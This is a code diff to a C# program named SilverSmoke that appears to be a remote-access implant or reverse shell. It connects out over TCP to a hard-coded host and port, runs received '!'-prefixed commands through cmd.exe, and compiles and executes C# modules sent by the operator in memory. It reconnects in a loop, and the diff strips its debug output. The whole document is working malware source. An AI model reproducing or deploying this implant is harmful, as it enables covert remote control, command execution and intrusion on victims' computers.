@@ -11,20 +11,18 @@ using System.Reflection;
 using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
-using System.Threading.Tasks;
 using System.Threading;
-using System.Collections.Generic;
 namespace SilverSmoke
 {
-    class Program
+    public static class Program
     {
         static StreamWriter streamWriter;
-        static string src;
-        static List<Task> taskList;
+        static StringBuilder bld;
         public static void InitMethod()
         {
             string host = "127.0.0.1";
             int port = 443;
+            bld = new StringBuilder();
 
             using (TcpClient client = new TcpClient(host, port)) //establish basic TCP connection
             {
@@ -46,14 +44,14 @@ namespace SilverSmoke
                         p.StartInfo.RedirectStandardError = true;
                         p.OutputDataReceived += new DataReceivedEventHandler(outh);
                         p.ErrorDataReceived += new DataReceivedEventHandler(errh);
-                        src = "";
+
                         bool ModuleCode = false;
                         while (true)
                         {
                             var data = rdr.ReadLine(); //read from conn
                             if (data != "//MODULE-END" && !(data.StartsWith("!")) && ModuleCode) //parse input: shell command or module src?
                             {
-                                src += data + "\n"; //append to module src
+                                bld.Append(data);
                             }
                             else if (data.StartsWith("!"))
                             {
@@ -64,12 +62,9 @@ namespace SilverSmoke
                                 catch (System.InvalidOperationException e)
                                 {
                                     //catch if cmd.exe is not started, and start it.
-                                    /*Console.WriteLine(e.GetType());
-                                    Console.WriteLine(e.Message);*/
                                     p.Start();
                                     p.BeginOutputReadLine();
                                     p.BeginErrorReadLine();
-                                    // p.StandardInput.WriteLine("@echo off");
                                     p.StandardInput.WriteLine(data.Substring(1));
                                 }
 
@@ -77,7 +72,7 @@ namespace SilverSmoke
                             else if (data == "//MODULE-END")
                             {
                                 ModuleCode = false;
-                                LoadAndExec(src, rdr);
+                                LoadAndExec(bld.ToString(), rdr);
 
 
                             }
@@ -98,10 +93,8 @@ namespace SilverSmoke
                 {
                     InitMethod();
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
-                    Console.WriteLine("[!] Exception occured: " + e.Message);
-                    Console.WriteLine(e.StackTrace);
                     Thread.Sleep(100);
                 }
             }
@@ -129,7 +122,6 @@ namespace SilverSmoke
                     }
                     break;
                 case "//C#":
-                    //Console.WriteLine("Loading C# in memory..."); //Debugging
                     TextWriter oldOut = Console.Out; //save this
                     Console.SetOut(streamWriter);
                     string[] dlls = lines[1].Substring(2).Split(','); //2nd line: list of DLLs, seperated by commas
@@ -164,16 +156,18 @@ namespace SilverSmoke
                         streamWriter.WriteLine(e.Message);
                     }
                     break;
+                default:
+                    streamWriter.WriteLine("[-] Invalid module format.");
+                    break;
             }
-            //Console.WriteLine(code);
-            src = ""; //cleanup
+            bld.Remove(0, bld.Length);
+            bld.Clear();
             streamWriter.WriteLine("SIGNAL-MODULE-FINISHED");
             return 0;
         }
         public static void compileInMemory(string code, string[] dlls, string namespc, string clss, string method, string[] argl)
         {
             CompilerParameters compilerParameters = new CompilerParameters();
-            string currentDirectory = Directory.GetCurrentDirectory();
             compilerParameters.GenerateInMemory = true;
             compilerParameters.TreatWarningsAsErrors = false;
             compilerParameters.GenerateExecutable = false;
@@ -220,7 +214,7 @@ namespace SilverSmoke
                 catch (Exception e)
                 {
                     streamWriter.WriteLine(e.Message);
-                };
+                }
 
             }
             else
@@ -245,7 +239,7 @@ namespace SilverSmoke
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception) { }
+                catch (Exception e) { streamWriter.WriteLine("[-] Error: " + e.Message); }
             }
         }
 
@@ -260,7 +254,7 @@ namespace SilverSmoke
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception) { }
+                catch (Exception e) { streamWriter.WriteLine("[-] Error: " + e.Message); }
             }
         }
     }
